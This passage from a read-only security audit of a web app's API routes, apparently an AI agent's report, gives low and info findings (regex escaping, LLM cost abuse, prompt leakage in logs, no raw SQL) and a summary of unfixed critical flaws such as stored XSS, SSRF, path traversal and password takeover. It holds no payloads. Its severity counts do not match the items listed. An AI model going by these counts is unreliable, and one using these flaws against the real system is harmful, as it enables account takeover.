+`tag` is currently always a hardcoded literal (`"title"`, `"pubDate"`, `"source"`, `"description"` — see lines 561-565). So this is safe today. But if a future refactor passes user input as `tag`, the regex constructor would interpret regex metacharacters in `tag` (e.g. `tag = "img>"` would create a malformed regex). Recommend using `tag.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")` before interpolating into the RegExp, OR using `String.prototype.match` with a precompiled regex.
+
+---
+
+#### ℹ️ INFO — `POST /api/influencers/search` is unauthenticated LLM trigger (cost attack)
+
+**File**: `src/app/api/influencers/search/route.ts:31-147`
+
+The handler calls `requireAuth(req)` (line 32) — so any authenticated user, including a viewer, can trigger up to 2 LLM calls per request (Strategy 1: web_search + LLM extraction; Strategy 2: pure LLM fallback). No rate limit. An attacker with one viewer JWT can run up Z.AI / OpenAI bills.
+
+This is a sub-case of the Critical "no rate limiting" finding but worth calling out separately because:
+1. The endpoint is unauthenticated beyond the basic JWT check (no role requirement).
+2. The endpoint always falls back to LLM if web_search fails — so the cost per request is guaranteed.
+3. The Z.AI web_search SDK call at line 55 has no per-user quota.
+
+**Fix**: Add `requireRole(req, "editor")` (don't let viewers trigger LLM), and add a per-user rate limit (5/hour).
+
+---
+
+#### ℹ️ INFO — `console.log` of full request body in some AI routes
+
+**Files**: `src/app/api/ai/assistant/route.ts:174`, `src/app/api/ai/chat/route.ts:89-92`, `src/app/api/ai/generate/route.ts:74`.
+
+Most AI routes log the LLM error message but not the user prompt. However, `src/app/api/ai/assistant/route.ts:175` interpolates `errMsg` (which can include user-prompt content if the LLM echoes it) into the next LLM message: `Tool "${action.action}" failed with error: ${errMsg}.` — this is fine for the LLM call, but if any error handler logs the conversation, the user prompt leaks. Recommend scrubbing prompts from error logs.
+
+---
+
+#### ℹ️ INFO — Confirmed: NO raw SQL anywhere in the codebase (positive finding)
+
+`rg -n "\\$queryRaw|\\$executeRaw|prisma\\.\\$query|raw\\s*\\(" src/` returns ZERO matches. Every database access goes through Prisma's typed query builder, which parameterizes all values. The only string-interpolated SQL is the DDL `CREATE DATABASE` in `src/app/api/customers/route.ts:34` (noted as Low severity above). NoSQL/Prisma injection via `where:` clauses does not exist — no `where: JSON.parse(body.filter)` patterns were found.
+
+---
+
+### Stage Summary
+
+- **Files audited**: 134 `route.ts` files under `src/app/api/`, plus `src/lib/{storage,db,tenant-db,llm,auth-guard,oauth-state,crypto,zai}.ts`, `src/middleware.ts`, `src/components/linkbio/bio-links.tsx`, `src/components/views/{chat,whatsapp,custom-report}.tsx`, `src/app/l/[slug]/page.tsx`.
+- **Code changes made by this audit**: None — read-only audit per task scope. No fixes were applied; the findings above are recommendations for the engineering team to implement.
+- **Severity breakdown**: 6 Critical (linkbio stored XSS; SSRF via mail; chat fileUrl XSS; storage.delete path traversal; manager→admin password takeover; zero rate limiting), 7 High (team/route mass assignment; ownerId/authorId mass assignment; quotations/invoices mass assignment; integration SSRF; execSync prisma db push; whatsapp webhook no validation; (the high-severity entries in the table)), 5 Medium (dangerouslySetInnerHTML CSS; JSON.parse without try/catch; linkbio click spam; file-upload-route readiness; serial-key Math.random; whatsapp mediaUrl XSS; fingerprint spoofable), 2 Low (CREATE DATABASE interpolation smell; extractTag regex-builder smell), 3 Info (influencers/search LLM cost attack; AI error logs; no raw SQL positive).
+- **Top 3 to fix immediately**: (1) Public `/api/linkbio/*` stored XSS via `javascript:` URL → unauthenticated account takeover of any logged-in user who clicks a link on a public bio page. (2) Manager→admin password change in `/api/users` PATCH → full platform takeover by any manager. (3) Zero rate limiting on `/api/auth/login` + `/api/auth/2fa/login` → brute-forceable passwords and TOTP codes.
+- **Overlap with prior audits**: This audit corroborates SECURITY-DATA Findings 4, 5, 6, 15 (cross-tenant IDOR, public WhatsApp webhook, public uploads) from the input-validation angle, and identifies 6 new Critical findings (stored XSS, SSRF, path traversal, mass-assignment password takeover) that the prior IDOR/secrets audits did not specifically call out. Recommend sequencing follow-up tasks: SECURITY-INPUT-1 (linkbio + chat XSS + storage.delete path traversal), SECURITY-INPUT-2 (mail SSRF + integration SSRF), SECURITY-INPUT-3 (rate limiting everywhere), SECURITY-INPUT-4 (mass-assignment hardening: ownerId/authorId/uploadedById + manager password change).
